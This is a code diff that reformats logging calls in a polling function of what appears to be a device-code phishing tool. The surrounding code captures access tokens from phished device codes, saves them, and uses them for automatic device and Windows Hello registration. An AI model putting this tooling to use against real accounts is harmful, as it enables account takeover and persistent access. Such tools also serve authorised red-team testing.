@@ -126,8 +126,8 @@ def poll(app) -> None:
                 if response.status_code != 200 or "access_token" not in response.json():
                     continue
                 access_token = response.json()["access_token"]
-                user_code = row['user_code']
-                logger.debug("Device code phishing successful for code '{}'", user_code)
+                user_code = row["user_code"]
+                logger.debug(f"Device code phishing successful for code '{user_code}'")
                 access_token_id = save_access_token(
                     access_token, f"Created using device code auth ({row['user_code']})"
                 )
@@ -158,7 +158,9 @@ def poll(app) -> None:
                         ("ACTION_IN_PROGRESS", row["device_code"]),
                     )
                     try:
-                        logger.debug("Performing auto action '{}' for code '{}'", row.get('auto_action'), user_code)
+                        logger.debug(
+                            f"Performing auto action '{row.get('auto_action')}' for code '{user_code}'"
+                        )
                         device_id = register(
                             access_token_id,
                             row.get("auto_device_name"),
@@ -178,7 +180,9 @@ def poll(app) -> None:
                             )
                             register_winhello(at_id)
                     except Exception as e:
-                        logger.error("Device code phishing successful for code '{}', but auto action '{}' failed: {}", user_code, row.get('auto_action'), e)
+                        logger.error(
+                            f"Device code phishing successful for code '{user_code}', but auto action '{row.get('auto_action')}' failed: {e}"
+                        )
                         connection.execute_db(
                             "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                             ("PARTIAL_SUCCESS", row["device_code"]),
